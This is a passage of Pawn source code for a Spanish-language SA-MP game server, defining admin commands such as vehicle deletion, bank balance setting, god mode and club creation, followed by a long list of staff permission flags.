			DestroyDynamic3DTextLabel(PLAYER_TEMP[playerid][py_DL_LABEL]);
			KillTimer(PLAYER_TEMP[playerid][py_DL_TIMER]);
			PLAYER_TEMP[playerid][py_DL_LABEL] = INVALID_3DTEXT_ID;
			return 1;
		}
		else return SendClientMessage(playerid, COLOR_WHITE, "USO: /dlply (playerid)");
	}
	if(toply == playerid) return SendClientMessage(playerid, COLOR_YELLOW, "No puedes usar este comando en ti mismo.");
	if(!IsPlayerConnected(toply)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado.");
	if(PLAYER_TEMP[playerid][py_DL_LABEL] != INVALID_3DTEXT_ID) return SendClientMessage(playerid, COLOR_WHITE, "Solo puedes tener un label de informaci�n.");

	new Float:vx, Float:vy, Float:vz, Float:x, Float:y, Float:z;
	GetPlayerVelocity(toply, vx, vy, vz);
	GetPlayerPos(toply, x, y, z);

	new string[250];
	format(string, sizeof(string), ""COL_YELLOW"Velocidad: "COL_WHITE"X %0.2f - Y %0.2f - Z %0.2f\n"COL_YELLOW"Posici�n: "COL_WHITE"X %0.2f - Y %0.2f - Z %0.2f\n"COL_YELLOW"Ping: "COL_WHITE"%d\n"COL_YELLOW"PacketLoss: "COL_WHITE"%0.2f", vx, vy, vz, x, y, z, GetPlayerPing(toply), NetStats_PacketLossPercent(toply));
	PLAYER_TEMP[playerid][py_DL_LABEL] = CreateDynamic3DTextLabel(string, COLOR_WHITE, 0.0, 0.0, -0.5, 15.0, .attachedplayer = toply, .testlos = 1, .playerid = playerid);
	PLAYER_TEMP[playerid][py_DL_TIMER] = SetTimerEx("UpdateLabel", 1000, true, "dd", playerid, toply);
	Streamer_Update(playerid);

	return 1;
}

CMD:destroypveh(playerid, params[])
{
	new vehicleid;
	if(sscanf(params, "d", vehicleid)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /destroypveh (vehicleid)");
	if(!IsValidVehicle(vehicleid) || !PLAYER_VEHICLES[vehicleid][player_vehicle_VALID]) return SendClientMessage(playerid, COLOR_WHITE, "Veh�culo inv�lido.");

	new ownerid = INVALID_PLAYER_ID;
	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
	{
		if(!IsPlayerConnected(i)) continue;
		if(ACCOUNT_INFO[i][ac_ID] == PLAYER_VEHICLES[vehicleid][player_vehicle_OWNER_ID]) ownerid = i;
	}

	new DB_Query_update[350];
	format(DB_Query_update, sizeof(DB_Query_update), "DELETE FROM `PLAYER_VEHICLES` WHERE `ID` = %d;", PLAYER_VEHICLES[vehicleid][player_vehicle_ID]);
	db_free_result(db_query(Database, DB_Query_update));

	SendClientMessageEx(ownerid, COLOR_WHITE, "El administrador "COL_YELLOW"%s "COL_WHITE"elimin� tu "COL_YELLOW"%s "COL_WHITE"(NP "COL_YELLOW"%s"COL_WHITE").", ACCOUNT_INFO[playerid][ac_NAME], VEHICLE_INFO[ GLOBAL_VEHICLES[vehicleid][gb_vehicle_MODELID] - 400 ][vehicle_info_NAME], GLOBAL_VEHICLES[vehicleid][gb_vehicle_NUMBER_PLATE]);
	SendClientMessageEx(playerid, COLOR_WHITE, "Eliminaste el "COL_YELLOW"%s "COL_WHITE"(NP "COL_YELLOW"%s"COL_WHITE") de "COL_YELLOW"%s"COL_WHITE".", VEHICLE_INFO[ GLOBAL_VEHICLES[vehicleid][gb_vehicle_MODELID] - 400 ][vehicle_info_NAME], GLOBAL_VEHICLES[vehicleid][gb_vehicle_NUMBER_PLATE], ACCOUNT_INFO[ownerid][ac_NAME]);

	if(PLAYER_PHONE[ownerid][player_phone_VALID])
	{
		RegisterPhoneMessage(1337, PLAYER_PHONE[ownerid][player_phone_NUMBER], "VEHICULO DESTRUIDO POR UN ADMINISTRADOR");
		if (PLAYER_PHONE[ownerid][player_phone_STATE] == PHONE_STATE_ON) SendClientMessageEx(ownerid, COLOR_WHITE, ""COL_GREEN"[Mensaje] "COL_WHITE"%s: VEHICULO DESTRUIDO POR UN ADMINISTRADOR", convertPhoneNumber(playerid, 1337));
	}

	new str[145];
    format(str, 145, "[ADMIN] %s (%d) elimin� la %s (NP %s) de %s.", ACCOUNT_INFO[playerid][ac_NAME], playerid, VEHICLE_INFO[ GLOBAL_VEHICLES[vehicleid][gb_vehicle_MODELID] - 400 ][vehicle_info_NAME], GLOBAL_VEHICLES[vehicleid][gb_vehicle_NUMBER_PLATE], ACCOUNT_INFO[ownerid][ac_NAME]);
    SendMessageToAdmins(COLOR_ANTICHEAT, str);

    new webhook[145];
	format(webhook, sizeof(webhook), ":page_with_curl: %s", str);
	SendDiscordWebhook(webhook, 1);

	if(GetPlayerVehicleID(ownerid) == vehicleid) RemovePlayerFromVehicle(ownerid);
	DestroyVehicleEx(vehicleid);

	if(!ACCOUNT_INFO[ownerid][ac_SU]) ReLockPlayerVehicles(ownerid);

	return 1;
}
flags:destroypveh(CMD_MODERATOR4)

CMD:setbankcash(playerid, params[])
{
	new to_player, amount;
	if(sscanf(params, "rd", to_player, amount)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setbankcash [player] [amount]");
	if(!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado.");
	if(0 > amount || amount > 2147483647) return SendClientMessage(playerid, COLOR_WHITE, "La cantidad no puede ser menor a 0 ni mayor a 2,147,483,647.");
	if(BANK_ACCOUNT[to_player][bank_account_BALANCE] == amount) return SendClientMessage(playerid, COLOR_WHITE, "El jugador ya tiene esa cantidad de dinero en el banco.");

	if(amount > BANK_ACCOUNT[to_player][bank_account_BALANCE]) RegisterBankAccountTransaction(BANK_ACCOUNT[to_player][bank_account_ID], 0, amount);
	else RegisterBankAccountTransaction(BANK_ACCOUNT[to_player][bank_account_ID], 1, amount);
	BANK_ACCOUNT[to_player][bank_account_BALANCE] = amount;

	ShowPlayerNotification(to_player, sprintf("Un administrador establecio tu dinero en el banco a ~r~$%d~w~.", amount), 5);
	SendClientMessage(playerid, COLOR_WHITE, sprintf("Estableciste el dinero en el banco de "COL_YELLOW"%s"COL_WHITE" a "COL_YELLOW"%d"COL_WHITE".", ACCOUNT_INFO[to_player][ac_NAME], amount));

	SaveUserData(to_player);
	return 1;
}
flags:setbankcash(CMD_ADMIN)

CMD:godmode(playerid, params[])
{
	if(!PLAYER_TEMP[playerid][py_GODMODE])
	{
		TextDrawShowForPlayer(playerid, Textdraws[textdraw_GODMODE][0]);
		TextDrawShowForPlayer(playerid, Textdraws[textdraw_GODMODE][1]);
		PLAYER_TEMP[playerid][py_GODMODE] = true;

		PLAYER_AC_INFO[playerid][CHEAT_PLAYER_HEALTH][p_ac_info_IMMUNITY] = gettime() + 3;

		CHARACTER_INFO[playerid][ch_HEALTH] = cellmax;
		Player_SetHealth(playerid, cellmax);
	}
	else
	{
		TextDrawHideForPlayer(playerid, Textdraws[textdraw_GODMODE][0]);
		TextDrawHideForPlayer(playerid, Textdraws[textdraw_GODMODE][1]);
		PLAYER_TEMP[playerid][py_GODMODE] = false;
		SetPlayerHealthEx(playerid, 100.0);
	}

	return 1;
}
alias:godmode("god")
flags:godmode(CMD_MODERATOR2)

CMD:createclub(playerid, params[])
{
	new
		interior,
		price,
		name[32],
		Float:x, Float:y, Float:z, Float:angle
	;
	if (sscanf(params, "dds[32]", interior, price, name)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /createclub <interior> <price> <nombre>");
	if(interior <= -1 || interior >= sizeof(CLUBS_INTERIORS)) return SendClientMessage(playerid, COLOR_WHITE, sprintf("Syntax: /createclub <interior (0-%d)> <price> <nombre>", sizeof(CLUBS_INTERIORS)));
	
	new welcome[64];
	format(welcome, 64, "Bienvenido a %s", name);

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, angle);
	CreateClub(name, welcome, x, y, z, angle, interior, price);
	SendClientMessage(playerid, COLOR_WHITE, "Club creado.");
	return 1;
}
flags:createclub(CMD_OWNER)

CMD:exclub(playerid, params[])
{
	new club_id;
	if (sscanf(params, "d", club_id)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /exclub <id>");
	if (club_id <= 0) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /exclub <id>");
	if (!CLUBS_INFO[club_id][club_VALID]) return SendClientMessage(playerid, COLOR_WHITE, "Ese club no existe");

	ReleaseClub(club_id);
	SendCmdLogToAdmins(playerid, "exclub", params);
	return 1;
}
flags:exclub(CMD_MODERATOR4)

#if defined PROFILER_PROFILER_INC
	CMD:profilerstart(playerid, params[])
	{
		Profiler_Start();
		return 1;
	}
	flags:profilerstart(CMD_OWNER)

	CMD:profilerstop(playerid, params[])
	{
		Profiler_Stop();
		return 1;
	}
	flags:profilerstop(CMD_OWNER)

	CMD:profilerdump(playerid, params[])
	{
		Profiler_Dump();
		return 1;
	}
	flags:profilerdump(CMD_OWNER)
#endif
	
CMD:allradio(playerid, params[])
{
	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
	{
		if (IsPlayerConnected(i))
		{
			StopAudioStreamForPlayer(i);
			PlayAudioStreamForPlayer(i, "http://boombox.hyaxe.com:8000/;?type=http&nocache=1");
		}
	}
	return 1;
}
flags:allradio(CMD_OWNER)

// Other flags
flags:ufo(CMD_MODERATOR)
flags:staff(CMD_HELPER)
flags:setveh(CMD_MODERATOR)
flags:setvh(CMD_MODERATOR)
flags:jailtime(CMD_MODERATOR)
flags:setmutes(CMD_MODERATOR4)
flags:setjails(CMD_MODERATOR4)
flags:setbans(CMD_MODERATOR4)
flags:setadv(CMD_MODERATOR4)
flags:resetinv(CMD_MODERATOR4)
flags:getresponse(CMD_OPERATOR)
flags:setkicks(CMD_MODERATOR4)
flags:initmarket(CMD_OPERATOR)
flags:initgraffiti(CMD_OPERATOR)
flags:dropitem(CMD_MODERATOR3)
flags:closeserver(CMD_ADMIN)
flags:stopall(CMD_OPERATOR)
flags:gift(CMD_OPERATOR)
flags:giftrep(CMD_OPERATOR)
flags:giftvip(CMD_OPERATOR)
flags:setpd(CMD_OPERATOR)
flags:pnot(CMD_MODERATOR)
flags:plog(CMD_MODERATOR)
flags:addcode(CMD_OPERATOR)
flags:muteard(CMD_HELPER)
flags:desmuteard(CMD_HELPER)
flags:trabajos(CMD_MODERATOR)
flags:getid(CMD_MODERATOR)
flags:getname(CMD_MODERATOR)
flags:getphone(CMD_MODERATOR)
flags:aka(CMD_MODERATOR)
flags:adv(CMD_MODERATOR)
flags:kick(CMD_MODERATOR)
flags:spec(CMD_MODERATOR)
flags:specoff(CMD_MODERATOR)
flags:freeze(CMD_MODERATOR)
flags:unfreeze(CMD_MODERATOR)
flags:freezeall(CMD_ADMIN)
flags:unfreezeall(CMD_ADMIN)
flags:pest(CMD_MODERATOR)
flags:pinv(CMD_MODERATOR)
flags:pexp(CMD_MODERATOR)
flags:pbank(CMD_MODERATOR)
flags:unjail(CMD_MODERATOR)
flags:ip(CMD_MODERATOR)
flags:traerveh(CMD_MODERATOR)
flags:vehinfo(CMD_MODERATOR)
flags:goto(CMD_MODERATOR)
flags:get(CMD_MODERATOR)
flags:unban(CMD_MODERATOR2)
flags:jail(CMD_MODERATOR)
flags:ban(CMD_MODERATOR)
flags:cls(CMD_MODERATOR)
flags:tban(CMD_MODERATOR)
flags:dban(CMD_MODERATOR)
flags:dtban(CMD_MODERATOR)
flags:rac(CMD_MODERATOR2)
flags:rac2(CMD_MODERATOR2)
flags:rv(CMD_MODERATOR2)
flags:pm(CMD_HELPER)
flags:atenderre(CMD_MODERATOR)
flags:darstaff(CMD_OWNER)
flags:ac(CMD_OWNER)
flags:setthirst(CMD_MODERATOR)
flags:sethungry(CMD_MODERATOR)
flags:setgas(CMD_MODERATOR)
flags:repairveh(CMD_MODERATOR)
flags:sethealth(CMD_MODERATOR)
flags:setarmour(CMD_MODERATOR)
flags:setlevel(CMD_OPERATOR)
flags:setwork(CMD_OPERATOR)
flags:setworkexp(CMD_OPERATOR)
flags:setcash(CMD_ADMIN)
flags:givecash(CMD_ADMIN)
flags:setbmlevel(CMD_OPERATOR)
flags:asay(CMD_ADMIN)
flags:lpos(CMD_MODERATOR)
flags:setworld(CMD_MODERATOR)
flags:setinterior(CMD_MODERATOR)
flags:v(CMD_MODERATOR2)
flags:dv(CMD_MODERATOR)
flags:setname(CMD_MODERATOR2)
flags:exproperty(CMD_MODERATOR4)
flags:gotoproperty(CMD_MODERATOR4)
flags:comandosadmin(CMD_HELPER)
flags:freezedetect(CMD_MODERATOR2)
flags:dlply(CMD_MODERATOR2)
flags:setpass(CMD_MODERATOR4)
flags:setip(CMD_MODERATOR4)
flags:accsaveall(CMD_MODERATOR4)
flags:delete(CMD_OWNER)
flags:rproperty(CMD_OPERATOR)
flags:eproperty(CMD_OPERATOR)
flags:cproperty(CMD_OPERATOR)
flags:eco(CMD_OPERATOR)
flags:darsu(CMD_OPERATOR)
flags:jailoff(CMD_MODERATOR)
flags:unjailoff(CMD_MODERATOR)
flags:setearsu(CMD_ADMIN)
flags:darvip(CMD_OPERATOR)
flags:darskin(CMD_MODERATOR4)
flags:setfstyle(CMD_MODERATOR4)
flags:ejercito(CMD_MODERATOR2)
flags:ls(CMD_MODERATOR)
flags:darmaverick(CMD_OPERATOR)
flags:explode(CMD_OPERATOR)
flags:jetpack(CMD_MODERATOR2)
flags:explosionbullet(CMD_ADMIN)
flags:ultradebug(CMD_MODERATOR)
flags:lsdb(CMD_MODERATOR)
flags:vpcar(CMD_ADMIN)
flags:rev(CMD_MODERATOR)
flags:a(CMD_MODERATOR)
flags:borrarop(CMD_MODERATOR2)
flags:admac(CMD_OWNER)
flags:depositveh(CMD_MODERATOR)